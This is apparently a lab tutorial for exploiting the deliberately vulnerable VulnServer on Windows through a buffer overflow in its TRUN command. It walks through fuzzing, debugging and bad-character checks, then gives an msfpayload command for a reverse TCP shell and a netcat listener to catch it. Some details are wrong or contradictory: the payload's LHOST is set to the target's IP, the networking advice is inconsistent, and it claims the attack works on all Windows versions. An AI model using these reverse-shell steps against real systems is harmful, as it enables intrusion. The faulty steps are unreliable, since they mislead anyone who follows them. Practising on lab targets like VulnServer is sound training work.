# Exploiting Windows Using Buffer Overflow


### Overview:
- This vulnerability works for all windows os such as  Win Xp,7,8,8.1,10.
- This is vulnerability can be caused due to the bad coding in softwares.
- For more detail about vulnerabilities: [Exploit Database](https://www.exploit-db.com/)


### We will use these tools
- Basic Python scripting
- Immunity Debugger/Ollydbg
- MONA plug-in for Immunity
- Metasploit Framework


### What You Need
- A Windows machine, real or virtual, to exploit
- A Kali Linux machine, real or virtual, as the attacker
- IF YOU ARE ATTACKING A WINDOWS 7 HOST FROM A VIRTUAL KALI: use Bridged networking mode, not NAT


### WARNING!!!
- VulnServer is unsafe to run.I recommend performing this project on virtual machines with NAT networking mode, so no outside attacker can exploit your windows machine.Turnoff antivirus and windows firewall.


### Here are the steps of the process
- Preparing a vulnerable server
- Fuzzing the server
- Using a debugger to examine the crash
- Targeting the EIP register
- Identifying bad characters
- Locating a vulnerable module with MONA
- Generating exploit code with Msfpayload
- Creating final exploit code


### Preparing the Vulnerable Server
- Install vulnserver.exe which I will include in these project files
- After running it, open it.As soon as vulnserver runs it opens default port = 9999

### Testing the Server
- In kali linux machine open terminal and execute below command
-    **nc (Ip address of windows) 9999**
-  **EX.:nc 192.168.119.129 9999**
- You should see a banner saying "Welcome to Vulnerable Server!"
- This server has many vulnerabilities, but the one we'll use now is in the TRUN command.
- On your Kali Linux machine, in the Terminal window, type TRUN .AAA and press Enter.
- The server responds saying "TRUN COMPLETE"
- Enter Exit
- If all works perfectly it means that we are on the track.


### Editing the final.py
- Enter: **"msfpayload windows/shell_reverse_tcp LHOST="Windows IP" LPORT=443 EXITFUNC=thread R | msfencode -b '\x00' -e x86/shikata_ga_nai"** 
- Copy the buff to the python file.
- Now using Immunity Debugger or Ollydbg Software find out the memory command for vulnserver in JMP and replace here "\xcd\x73\xa3\x77" in code.
- Now replace host with Windows IP
- Now just open terminal of kali linux and run the command 
- 	**nc -nlvp 443**
- Then run vulnserver.exe and run final.py on windows
- And if all goes right, windows is exploited using bufferoverflow.
